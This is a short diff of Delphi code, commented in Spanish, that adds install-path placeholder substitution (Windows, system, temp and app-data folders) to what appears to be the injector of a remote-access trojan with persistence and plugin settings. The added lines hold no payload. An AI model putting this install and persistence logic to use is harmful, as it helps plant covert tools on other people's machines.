@@ -265,5 +265,18 @@ end;
       ConfigCompartida^.sPluginName := Configuracion.sPluginName;
       ConfigCompartida^.sInyectadorFile := paramstr(0); //para informar a conectador.exe donde estoy
       ConfigCompartida^.bPersistencia := Configuracion.bPersistencia;
+
+      //Sustituimos las variables de instalacion posibles
+      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
+      '%WinDir%\', FindWindowsDir());
+      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
+      '%SysDir%\', FindSystemDir());
+      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
+      '%TempDir%\', FindTempDir());
+      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
+      '%RootDir%\', FindRootDir());
+      Configuracion.sCopyTo := StringReplace(Configuracion.sCopyTo,
+      '%AppDir%\', GetSpecialFolderPath($001C));
+      
  end;
 end.
